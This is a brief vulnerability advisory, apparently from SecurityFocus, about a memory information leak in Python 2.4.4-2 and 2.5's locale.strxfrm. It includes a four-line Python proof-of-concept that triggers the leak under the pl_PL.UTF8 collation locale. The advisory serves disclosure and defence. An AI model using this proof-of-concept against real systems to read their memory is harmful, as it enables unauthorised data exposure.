source: http://www.securityfocus.com/bid/23887/info

Python applications that use the 'PyLocale_strxfrm' function are prone to an information leak.

Exploiting this issue allows remote attackers to read portions of memory.

Python 2.4.4-2 and 2.5 are confirmed vulnerable. 

#!/usr/bin/python

import locale

print locale.setlocale(locale.LC_COLLATE, 'pl_PL.UTF8')
print repr(locale.strxfrm('a'))
